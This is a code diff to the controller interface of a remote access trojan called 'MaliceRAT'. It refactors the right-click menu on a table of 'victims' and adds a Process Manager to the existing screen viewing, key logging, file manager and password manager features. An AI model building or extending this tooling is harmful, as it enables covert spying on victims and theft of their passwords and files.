@@ -322,11 +322,12 @@ namespace MaliceRAT
             ContextMenuStrip victimContextMenu = new ContextMenuStrip();
             var menuItems = new[]
             {
-                ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click),
-                ContextMenuUtilities.CreateContextMenuItem("Key Logger", KeyLogger_Click),
-                ContextMenuUtilities.CreateContextMenuItem("File Manager", FileManager_Click),
-                ContextMenuUtilities.CreateContextMenuItem("Password Manager", PasswordManager_Click),
-                ContextMenuUtilities.CreateContextMenuItem("Disconnect", Disconnect_Click)
+                CreateMenuItem("View Screen", ViewScreen_Click),
+                CreateMenuItem("Key Logger", KeyLogger_Click),
+                CreateMenuItem("File Manager", FileManager_Click),
+                CreateMenuItem("Password Manager", PasswordManager_Click),
+                CreateMenuItem("Process Manager", ProcessManager_Click),
+                CreateMenuItem("Disconnect", Disconnect_Click)
             };
 
             victimContextMenu.Items.AddRange(menuItems);
@@ -334,26 +335,16 @@ namespace MaliceRAT
             gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaTable_MouseDown(sender, e, gunaVictimsTable);
         }
 
-        private void ViewScreen_Click(object sender, EventArgs e)
+        private ToolStripMenuItem CreateMenuItem(string text, EventHandler clickEvent)
         {
-            OpenFormIfIdExists<ScreenViewForm>(id => new ScreenViewForm(id, server));
+            return ContextMenuUtilities.CreateContextMenuItem(text, clickEvent);
         }
 
-        private void KeyLogger_Click(object sender, EventArgs e)
-        {
-            OpenFormIfIdExists<KeyLoggerForm>(id => new KeyLoggerForm(id, server));
-        }
-
-        private void FileManager_Click(object sender, EventArgs e)
-        {
-            OpenFormIfIdExists<FileManagerForm>(id => new FileManagerForm(id, server));
-        }
-
-        private void PasswordManager_Click(object sender, EventArgs e)
-        {
-            OpenFormIfIdExists<PasswordManagerForm>(id => new PasswordManagerForm(id, server));
-        }
-
+        private void ViewScreen_Click(object sender, EventArgs e) => OpenFormIfIdExists<ScreenViewForm>(id => new ScreenViewForm(id, server));
+        private void KeyLogger_Click(object sender, EventArgs e) => OpenFormIfIdExists<KeyLoggerForm>(id => new KeyLoggerForm(id, server));
+        private void FileManager_Click(object sender, EventArgs e) => OpenFormIfIdExists<FileManagerForm>(id => new FileManagerForm(id, server));
+        private void PasswordManager_Click(object sender, EventArgs e) => OpenFormIfIdExists<PasswordManagerForm>(id => new PasswordManagerForm(id, server));
+        private void ProcessManager_Click(object sender, EventArgs e) => OpenFormIfIdExists<ProcessManagerForm>(id => new ProcessManagerForm(id, server));
         private void Disconnect_Click(object sender, EventArgs e)
         {
             var id = GetSelectedId();
